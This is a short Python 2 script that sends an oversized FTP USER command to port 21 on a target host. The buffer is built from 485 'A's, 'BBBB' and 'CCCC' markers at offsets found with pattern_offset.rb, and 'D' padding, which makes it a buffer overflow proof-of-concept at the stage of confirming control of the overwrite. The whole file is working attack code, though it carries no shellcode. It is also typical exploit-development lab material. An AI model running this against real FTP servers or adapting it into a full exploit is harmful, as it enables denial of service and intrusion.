#!/usr/bin/python

import socket, sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 21))

print sock.recv(1500)

# ./pattern_offset.rb -q 32714131
# [*] Exact match at offset 485

# ./pattern_offset.rb -q 71413471
# [*] Exact match at offset 493

buffer = "A" * 485

buffer += "BBBB"

buffer += "CCCC"

buffer += "D" * ( 1100 - len(buffer) )

sock.send("USER " + buffer + "\r\n")

print sock.recv(1500)

sock.send("PASS demo@demo.com\r\n")

print sock.recv(1500)

sock.close()
